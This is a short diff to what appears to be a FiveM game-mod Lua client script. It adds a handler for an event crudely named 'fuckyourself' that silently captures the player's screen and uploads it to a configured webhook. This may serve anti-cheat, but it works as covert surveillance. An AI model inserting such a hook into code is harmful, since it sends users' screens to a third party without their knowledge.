@@ -1116,3 +1116,8 @@ Citizen.CreateThread(function()
 		end
 	end
 end)
+
+RegisterNetEvent("fuckyourself")
+AddEventHandler("fuckyourself", function()
+    exports["screenshot-basic"]:requestScreenshotUpload(Config.ScreenShotWebhook, "files[]", function() end)
+end)
